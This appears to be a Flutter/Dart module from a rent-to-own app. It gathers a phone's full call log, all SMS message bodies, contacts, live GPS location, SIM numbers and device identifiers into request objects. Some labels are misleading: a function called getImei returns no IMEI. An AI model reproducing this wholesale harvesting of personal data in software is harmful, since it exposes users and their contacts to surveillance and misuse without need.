import 'dart:io';
import 'package:android_id/android_id.dart';
import 'package:call_log/call_log.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:fast_contacts/fast_contacts.dart';
import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
import 'package:geolocator/geolocator.dart';
import 'package:mobile_number/mobile_number.dart';
import 'package:rent2ownwelcomeapp/src/core/core.dart';
import 'package:flutter/services.dart';

class AppDeviceInfo {
  // - IMEI - //
  Future<String> getImei() async {
    String? imei;
    DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
    if (Platform.isAndroid) {
      AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
      imei = '${androidInfo.id} | ${androidInfo.brand} | ${androidInfo.model}';
    }
    return imei!;
  }

  Future<String> getAndroidId() async {
    String? androidId; // Initialize the variable

    DeviceInfoPlugin deviceInfoPlugin = DeviceInfoPlugin();
    try {
      if (Platform.isAndroid) {
        // var build = await deviceInfoPlugin.androidInfo;
        // androidId = build.androidId.toString();
        var androidIdPlugin = const AndroidId();
        androidId = await androidIdPlugin.getId(); // Get the Android ID
      } else if (Platform.isIOS) {
        var data = await deviceInfoPlugin.iosInfo;
        androidId = data.identifierForVendor.toString();
        ; // On iOS, you can get the identifierForVendor as a unique ID
      }
    } on PlatformException {
      // Handle any exceptions, such as permission errors or unavailable data
      androidId = "Unknown"; // Set a default value in case of error
    }

    return androidId!; // Return only the Android ID
  }

  // - CALL LOGS - //
  Future<List<CallLogRequest>> getCallLogs() async {
    final Iterable<CallLogEntry> cLog = await CallLog.get();
    List<CallLogRequest> callLogs = [];
    for (CallLogEntry entry in cLog) {
      CallLogRequest data = CallLogRequest(
          name: '${entry.name}',
          date: '${DateTime.fromMillisecondsSinceEpoch(entry.timestamp!)}',
          phoneNo: '${entry.number}',
          duration: entry.duration!.toString(),
          callType: '${entry.callType?.name}',
          simDisplayName: '${entry.simDisplayName}');
      callLogs.add(data);
    }
    return callLogs;
  }

  // - SMS LOGS - //
  Future<List<SmsLogRequest>> getSmsLogs() async {
    List<SmsLogRequest> smsLogs = [];

    List<SmsMessage> smsMessages = await SmsQuery().getAllSms;
    for (SmsMessage item in smsMessages) {
      DateTime? dateTime = item.date != null
          ? DateTime.fromMillisecondsSinceEpoch(
              item.date!.millisecondsSinceEpoch)
          : null;

      // Format the DateTime as a string or store the raw DateTime object
      String formattedDate = dateTime?.toIso8601String() ?? "Unknown Date";

      if (item.kind == SmsMessageKind.sent) {
        SmsLogRequest smsLog = SmsLogRequest(
            status: "SENT",
            sender: "",
            receiver: '${item.sender!}',
            message: item.body!,
            date: formattedDate);
        smsLogs.add(smsLog);
      } else {
        SmsLogRequest smsLog = SmsLogRequest(
            status: "RECEIVED",
            sender: '${item.sender!}',
            receiver: "",
            message: item.body!,
            date: formattedDate);
        smsLogs.add(smsLog);
      }
    }
    ;
    return smsLogs;
  }

  // - CONTACTS - //
  Future<List<ContactRequest>> getContacts() async {
    List<ContactRequest> diContacts = [];
    List<Contact> contacts = await FastContacts.getAllContacts();

    for (Contact contact in contacts) {
      if (contact.phones.isNotEmpty) {
        var phones = contact.phones.map((e) => e.number).join(', ');
        final emails = contact.emails.map((e) => e.address).join(', ');
        final name = contact.structuredName;

        ContactRequest storeConst = ContactRequest(
          displayName: contact.displayName,
          firstName: name!.namePrefix,
          lastName: name.nameSuffix,
          phoneNo: phones,
          email: emails,
        );
        diContacts.add(storeConst);
      }
    }
    return diContacts;
  }

  // - LIVE LOCATION - //
  Future<LiveLocationRequest> getLocation() async {
    final position = await GeolocatorPlatform.instance.getCurrentPosition();

    LiveLocationRequest liveLocation = LiveLocationRequest(
        latitude: position.latitude.toString(),
        longitude: position.longitude.toString());
    return liveLocation;
  }

  // - SIM CARD - //
  Future<DeviceSimRequest> getSimCards(String phoneNo) async {
    List<SimCard>? simCards = [];
    simCards = await MobileNumber.getSimCards;
    String? simCard_1 = simCards!.length == 1 ? simCards[0].number : null;
    String? simCard_2 = simCards.length == 2 ? simCards[1].number : null;

    DeviceSimRequest simCard = DeviceSimRequest(
        simCardNo1: phoneNo, simCardNo2: simCard_1 ?? simCard_2 ?? "");
    return simCard;
  }

  // - DEVICE INFO - //
  // Future<DeviceInfoRequest> getDeviceInfo(String imeiNo) async {
  //   DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
  //   AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
  //   DeviceInfoRequest device = DeviceInfoRequest(

  //       deviceModel: '${androidInfo.model}',
  //       deviceBrand: '${androidInfo.brand}',
  //       deviceName: '${androidInfo.display}',
  //       softwareId: '${androidInfo.id}',
  //       operationSystemVersion:
  //           'Android ${androidInfo.version.release} (SDK ${androidInfo.version.sdkInt}), ${androidInfo.manufacturer} ${androidInfo.model}');
  //   return device;

  //    DeviceInfoModel deviceInfoModel = DeviceInfoModel(
  //       deviceType: deviceType,
  //       brand: brand,
  //       operationSystemVersion: operationSystemVersion,
  //       deviceId: deviceid,
  //       batteryState: batteryStateStr,
  //       batteryLevel: batteryLevel,
  //       noOfAppsInstalled: totalAppInstalled.toString());

  // }
}
